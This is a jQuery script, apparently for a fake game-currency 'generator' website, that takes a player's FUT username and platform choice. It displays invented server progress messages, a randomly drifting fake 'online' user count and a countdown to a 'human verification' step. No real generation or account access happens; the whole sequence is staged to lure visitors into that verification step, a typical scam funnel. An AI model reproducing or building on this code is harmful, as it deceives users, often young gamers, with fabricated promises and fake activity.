$(document).ready(function() {
	
	////////////////
	// Domain Subfolder Name
	//////////////// 
	var $subfolder_name = '';
	
	
	////////////////
	// Human Verification Timer
	////////////////
	var $human_verification_timer_value = '75'; //Countdown remaing time in seconds
	
	////////////////
	// Sound Settings: 1 = ON | 0 = OFF
	//////////////// 
	$sound_setting = 0;	
	
	////////////////
	// How to Use Slider
	////////////////
	$('.how-to-use').slick({
		infinite: false,
		slidesToShow: 1,
		slidesToScroll: 1
	});	
	function progressBarHowTo(percent, $element) {
		var progressBarHowToWidth = percent * $element.width() / 100;
		$element.find('div').animate({ width: progressBarHowToWidth }, 200).html(percent + "%&nbsp;");
	}
	if ($(".how-to-progress-dot-4")[0]){
		progressBarHowTo(0, $('#progressBarHowTo'));	
		$('.how-to-use').on('afterChange', function(event, slick, currentSlide) {
			console.log(slick, currentSlide);
			if (slick.$slides.length-4 == currentSlide) {
				progressBarHowTo(0, $('#progressBarHowTo'));
				$('.how-to-progress-dot-2').removeClass('passed');
			}
			if (slick.$slides.length-3 == currentSlide) {
				progressBarHowTo(30, $('#progressBarHowTo'));
				$('.how-to-progress-dot-2').addClass('passed');
				$('.how-to-progress-dot-3').removeClass('passed');
			}
			if (slick.$slides.length-2 == currentSlide) {
				progressBarHowTo(60, $('#progressBarHowTo'));
				$('.how-to-progress-dot-3').addClass('passed');
				$('.how-to-progress-dot-4').removeClass('passed');
			}
			if (slick.$slides.length-1 == currentSlide) {
				progressBarHowTo(100, $('#progressBarHowTo'));
				$('.how-to-progress-dot-4').addClass('passed');
			}
		});
	}
	else {
		progressBarHowTo(0, $('#progressBarHowTo'));	
		$('.how-to-use').on('afterChange', function(event, slick, currentSlide) {
			console.log(slick, currentSlide);
			if (slick.$slides.length-3 == currentSlide) {
				progressBarHowTo(0, $('#progressBarHowTo'));
				$('.how-to-progress-dot-2').removeClass('passed');
			}
			if (slick.$slides.length-2 == currentSlide) {
				progressBarHowTo(50, $('#progressBarHowTo'));
				$('.how-to-progress-dot-2').addClass('passed');
				$('.how-to-progress-dot-3').removeClass('passed');
			}
			if (slick.$slides.length-1 == currentSlide) {
				progressBarHowTo(100, $('#progressBarHowTo'));
				$('.how-to-progress-dot-3').addClass('passed');
			}
		});
	}

	$('.how-to-use').on('beforeChange', function(event, slick, currentSlide, nextSlide){
		if ($sound_setting == 1) {
			ion.sound.play("button-click");
		}
	});
	
	////////////////
	// Platform Select
	////////////////
	var $selected_platform = '';	
	function fixplatformBox($platform_parent_class) {
        resetplatformBoxes();
        if ($platform_parent_class.hasClass('platform-item-1')) {
            $selected_platform = 'Windows PC';
            $selected_platform_svg = 'img/origin.svg';
        }
        if ($platform_parent_class.hasClass('platform-item-2')) {
            $selected_platform = 'Playstation 4';
			$selected_platform_svg = 'img/ps4.svg';
        }
		if ($platform_parent_class.hasClass('platform-item-3')) {
            $selected_platform = 'Xbox One';
			$selected_platform_svg = 'img/xboxone.svg';
        }
        $platform_parent_class.addClass('active');
    }	
    function resetplatformBoxes() {
        var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3');	
        if ($platform_list.hasClass('active')) {
            $platform_list.removeClass('active');
        }
    }
	$('.platform-item').click(function() {
		if ($(this).hasClass('active')) {			
		} else {
			if ($sound_setting == 1) {
				ion.sound.play("button-click");
			}
		}
		fixplatformBox($(this));	
		if ($('#fut-username').val() != '') {
			$('#b-1').removeClass('n-a');
		}	
    });

	
});

////////////////
// Status - Online Count
////////////////
var starting_number = 171;
var random;
function online_count() {
	document.getElementById("online-count").innerHTML = starting_number;
	var randCalc = Math.floor(Math.random() * 10 + 1);
	if (randCalc <= 5) {
		starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
	} else {
		starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
	}
	random = setTimeout("online_count()", 4500);
}
online_count();

////////////////
// Status - Last Update
////////////////
document.getElementById("date").innerHTML = formatAMPM();
function formatAMPM() {
	var d = new Date(),

		hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
		ampm = d.getHours() >= 12 ? 'pm' : 'am',
		months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'],
		days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	return d.getDate() + '.' + months[d.getMonth()] + '.' + d.getFullYear();
}

function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

////////////////
// Human Verification Countdown
////////////////
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' min. i ' + seconds + ' sek.';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
/*
var lnk = window.location.href;
*/

$('#fut-username').keyup(function(){
	if ($(this).val() != '') {
		$('#b-1').removeClass('n-a');
	}
	else if ($(this).val() == '') {
		$('#b-1').addClass('n-a');			
	}	
});
if ($('#fut-username').val() != '') {
	$('#b-1').removeClass('n-a');
}
/*
if ($.MD5(lnk) != $('#sessid').val() ) {
	$('body').empty();
}
*/
$('#b-1').click(function() {
	var username = $('#fut-username').val();
	$('#step-one .username-here').text(username);
	$('.connected-player-username').text(username);

	var opcjadruga = $(".jakieopcje option:selected").text();
	$('.connected-player-secondoption').text(opcjadruga);
	
	$('.step-zero').fadeOut(function() {
		$('#step-one').fadeIn();
	});

	setTimeout(function() {
		$('#step-one').fadeOut(function() {
			$('#step-two').fadeIn();
		});
	}, 3500);
});

function pasekPostepu(procent) {
	$('#progressBarConsole div').text(procent + '%');
	$('#progressBarConsole div').css({
		width: procent+'%'
	});
}

var globalne = [];

$('.resource-1-content .resource-item-column').click(function() {
	var krok1CoWygenerowal = $(this).find('.res-value-top').text();
	globalne[0] = krok1CoWygenerowal;
	var ileDoGenerowania = $('#ileDoGenerowania').val();
	if (ileDoGenerowania == 2) {
		$('.resource-1-content').fadeOut(function() {
			$('.resource-2-content').fadeIn();
		});
	}
	else {
		$('.resource-1-content').fadeOut(function() {
			$('#console-wrapper').fadeIn();
		});

		// proces generowania w przypadku wybrania tylko 1 'rzeczy' do generowania
		$('.console-message').text('Preparing the server for authorization');
		pasekPostepu(15);

		setTimeout(function() {
			$('.console-message').text('Checking availability ' + krok1CoWygenerowal + '...');
			pasekPostepu(35);

				setTimeout(function() {
			$('.console-message').text('Assigning to your account ' + globalne[0] + '...');
			pasekPostepu(40);


			setTimeout(function() {
				$('.console-message').text('Generating...');
				pasekPostepu(55);
				
				setTimeout(function() {
					$('.console-message').text('Checking the database and security system...');
					pasekPostepu(90);

					setTimeout(function() {
						$('#console-wrapper').fadeOut(function() {
							$('#verification-wrapper').fadeIn();
						});
					
					}, 2000);
				
				}, 3000);

			}, 3000);
				}, 3000);

		}, 3000);
	}
}); 

$('.resource-2-content .resource-item-column').click(function() {
	var krok2CoWygenerowal = $(this).find('.res-value-top').text();
	
	
	$('.resource-2-content').fadeOut(function() {
			$('#console-wrapper').fadeIn();
	});

	// proces generowania w przypadku wybrania 2 'rzeczy' do generowania
	$('.console-message').text('Preparing the server authorization...');
	pasekPostepu(15);

	setTimeout(function() {
		$('.console-message').text('Generating...');
		pasekPostepu(25);

		setTimeout(function() {
			$('.console-message').text('Assigning to your account ' + globalne[0] + '...');
			pasekPostepu(40);
			

			setTimeout(function() {
				$('.console-message').text('Assigning to your account ' + krok2CoWygenerowal + '...');
				pasekPostepu(70);
				

				setTimeout(function() {
					$('.console-message').text('Checking the database and securing traces...');
					pasekPostepu(90);

					setTimeout(function() {
						$('#console-wrapper').fadeOut(function() {
							$('#verification-wrapper').fadeIn();
						});
					
					}, 2000);
				
				}, 3000);

			}, 3000);

		}, 3000);

	}, 3000);
	

});

